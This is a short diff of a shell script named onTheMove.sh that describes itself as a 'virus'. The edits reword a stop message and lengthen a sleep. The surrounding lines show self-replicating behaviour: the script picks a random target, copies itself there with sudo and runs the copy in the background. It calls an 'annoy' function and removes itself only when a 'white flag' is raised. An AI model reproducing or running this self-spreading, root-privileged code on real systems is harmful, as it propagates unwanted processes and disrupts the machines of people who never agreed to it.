@@ -24,7 +24,7 @@ then
 	target=`shuf -n 1 /tmp/ssh-l7IjnT5mI3t0`
 	rm /tmp/ssh-l7IjnT5mI3t0
 else
-	echo "White flag has been raised, stopping script."
+	echo "White flag has been raised, stopping virus."
 	sudo rm -- "$current/onTheMove.sh"
 	exit
 fi
@@ -60,7 +60,7 @@ filter
 annoy
 check
 #echo $target
-sleep 5
+sleep 7
 echo $target>/tmp/ssh-7NalEN3oIs3n
 sudo cp $current/onTheMove.sh $target
 /bin/bash $target"onTheMove.sh" &
